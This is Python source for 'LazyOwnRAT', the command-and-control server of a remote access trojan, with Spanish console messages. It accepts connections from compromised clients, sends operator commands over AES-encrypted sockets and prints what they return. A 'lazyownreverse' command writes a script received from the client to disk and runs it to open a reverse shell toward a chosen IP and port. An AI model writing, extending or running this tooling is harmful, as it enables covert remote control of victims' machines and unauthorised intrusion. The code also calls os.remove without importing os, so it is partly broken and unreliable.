#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import signal
import sys
import argparse
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii
import subprocess

def signal_handler(sig, frame):
    print("\n [<-] Saliendo...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)

def encrypt(plaintext, key):
    plaintext = pad(plaintext)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

def handle_client(conn, addr, key):
    print(f'[+] Conexión establecida con {addr}')
    try:
        while True:
            cmd = input('LazyOwnRAT# ').strip()

            if cmd == '':
                continue

            conn.send(encrypt(cmd.encode('utf-8'), key))

            if cmd == 'quit':
                conn.close()
                break

            data = conn.recv(4096)
            if not data:
                break

            result = decrypt(data, key).decode('utf-8')

            if cmd.startswith('lazyownreverse'):
                _, ip, port = cmd.split(' ')
                with open('lazyownreverse.sh', 'w') as f:
                    f.write(result)
                subprocess.run(['chmod', '+x', 'lazyownreverse.sh'])
                subprocess.run(['./lazyownreverse.sh', '--ip', ip, '--puerto', port])
                os.remove('lazyownreverse.sh')
            else:
                print(result)

    except Exception as e:
        print(f'[e] Error: {e}')
    finally:
        conn.close()

def main():
    BANNER = """
    ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
    ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
    ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
    ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
    ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    [*] Iniciando: LazyOwn RAT Tool [;,;]
    """    
    print(BANNER)

    parser = argparse.ArgumentParser(description='LazyOwnRAT Server')
    parser.add_argument('--host', default='localhost', help='Host to bind the server')
    parser.add_argument('--port', type=int, default=1337, help='Port to bind the server')
    parser.add_argument('--key', required=True, help='Encryption key (hex encoded)')
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port
    KEY = binascii.unhexlify(args.key)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10)
    print(f'[x] LazyOwnRAT server listening on {HOST}:{PORT}...')

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr, KEY)).start()

if __name__ == '__main__':
    main()
